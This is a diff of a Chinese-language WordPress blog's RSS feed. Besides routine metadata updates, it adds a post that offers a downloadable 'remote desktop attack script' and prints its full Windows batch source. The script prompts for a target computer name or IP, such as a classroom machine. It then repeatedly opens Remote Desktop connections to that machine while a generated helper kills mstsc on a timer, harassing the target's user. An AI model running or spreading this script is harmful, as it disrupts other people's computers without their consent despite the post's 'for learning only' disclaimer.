@@ -12,13 +12,13 @@
 	<atom:link href="https://sodih3iw.github.io/index.php/category/uncategorized/feed/" rel="self" type="application/rss+xml" />
 	<link>https://sodih3iw.github.io/</link>
 	<description>让我们学些东西……</description>
-	<lastBuildDate>Sat, 05 Apr 2025 13:25:03 +0000</lastBuildDate>
+	<lastBuildDate>Sat, 14 Jun 2025 06:35:39 +0000</lastBuildDate>
 	<language>zh-Hans</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
 	<sy:updateFrequency>
 	1	</sy:updateFrequency>
-	<generator>https://wordpress.org/?v=6.7.2</generator>
+	<generator>https://wordpress.org/?v=6.8.1</generator>
 
 <image>
 	<url>https://sodih3iw.github.io/wp-content/uploads/2025/03/cropped-IMG_2059-32x32.png</url>
@@ -28,6 +28,103 @@
 	<height>32</height>
 </image> 
 	<item>
+		<title>远程桌面攻击脚本</title>
+		<link>https://sodih3iw.github.io/index.php/2025/06/14/remote-desktop-attack-scripts/</link>
+					<comments>https://sodih3iw.github.io/index.php/2025/06/14/remote-desktop-attack-scripts/#respond</comments>
+		
+		<dc:creator><![CDATA[sodih3iw]]></dc:creator>
+		<pubDate>Sat, 14 Jun 2025 06:34:59 +0000</pubDate>
+				<category><![CDATA[未分类]]></category>
+		<guid isPermaLink="false">https://sodih3iw.github.io/?p=238</guid>
+
+					<description><![CDATA[远程桌面攻击脚本简介 作者：朱佳乐深沉地爱着你 作用：使用远程桌面攻击已知密码的计算机 支持系统： Windo [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<h2 class="wp-block-heading">远程桌面攻击脚本简介</h2>
+
+
+
+<p>作者：朱佳乐深沉地爱着你</p>
+
+
+
+<p>作用：使用远程桌面攻击已知密码的计算机</p>
+
+
+
+<p>支持系统： Windows 7 及以上</p>
+
+
+
+<div class="wp-block-file"><a id="wp-block-file--media-c4cb77b2-122b-4c45-8347-96fb23b856e5" href="https://sodih3iw.github.io/wp-content/uploads/2025/06/main.zip">main</a><a href="https://sodih3iw.github.io/wp-content/uploads/2025/06/main.zip" class="wp-block-file__button wp-element-button" download aria-describedby="wp-block-file--media-c4cb77b2-122b-4c45-8347-96fb23b856e5">下载</a></div>
+
+
+
+<h2 class="wp-block-heading">源代码</h2>
+
+
+
+<pre class="wp-block-code"><code>@echo off
+color f0
+title 朱佳乐深沉地爱着你 远程桌面攻击脚本
+echo 作者：朱佳乐深沉地爱着你
+echo 本脚本使用远程桌面攻击已知密码的计算机
+echo 注意：本脚本仅供交流学习，禁止使用本脚本进行恶作剧
+echo 注意：本脚本运行时不能打开远程桌面，本脚本不能同时运行多个
+echo.
+echo ########################################
+echo 请输入靶机的“计算机名称”或“IP地址”，不区分大小写
+echo 例如：room-stu-01  student-13-win7  teacher-57  192.168.100.98
+
+:entername
+set name=000.000.000.000
+set /p name=请输入：
+if %name%==000.000.000.000 (
+    echo 输入不能为空！
+    goto entername
+)
+
+echo.
+echo ########################################
+echo 请输入攻击间隔时间（单位：秒）
+echo 即每次攻击开始到结束的时间，太短可能导致没有连接成功就结束
+echo 例如：5  8（推荐）  10
+
+:entertime
+set waittime=0
+set /p waittime=请输入：
+if %waittime%==0 (
+    echo 输入不能为0或空！
+    goto entertime
+)
+
+del kill.bat > nul
+echo @echo off > kill.bat
+echo :start >> kill.bat
+echo timeout /t %waittime% >> kill.bat
+echo taskkill /im mstsc.exe /f >> kill.bat
+echo goto start >> kill.bat
+
+echo.
+echo ########################################
+echo 接下来进行测试连接，请注意每个“记住”、“不再”选项都要勾选
+echo 按下任意键测试……
+pause > nul
+mstsc /v %name% /span
+echo 如果测试成功，按下任意键开始……
+pause > nul
+
+start /min kill.bat
+:start
+mstsc /v %name% /w:1 /h:1
+goto start</code></pre>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://sodih3iw.github.io/index.php/2025/06/14/remote-desktop-attack-scripts/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
 		<title>经典复古游戏分享</title>
 		<link>https://sodih3iw.github.io/index.php/2025/03/17/classic-retro-game-sharing/</link>
 					<comments>https://sodih3iw.github.io/index.php/2025/03/17/classic-retro-game-sharing/#respond</comments>
